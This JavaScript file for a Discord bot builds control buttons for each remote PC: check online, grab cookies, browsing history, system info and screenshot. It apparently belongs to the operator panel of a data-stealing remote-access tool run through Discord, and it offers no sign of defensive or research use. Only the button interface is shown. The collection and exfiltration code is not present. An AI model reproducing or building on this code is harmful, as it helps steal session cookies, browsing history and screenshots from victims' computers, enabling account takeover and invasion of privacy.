import { ActionRowBuilder, ButtonBuilder, ButtonStyle } from "discord.js";

// Экспорт функции создания кнопок
export function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`check_online|${safePcId}`)
                .setLabel("Чек онлайн")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`get_cookies|${safePcId}`)
                .setLabel("Куки")
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`get_history|${safePcId}`)
                .setLabel("История")
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`get_system|${safePcId}`)
                .setLabel("Системная")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`get_screenshot|${safePcId}`)
                .setLabel("Скриншот")
                .setStyle(ButtonStyle.Secondary)
        )
    ];
}
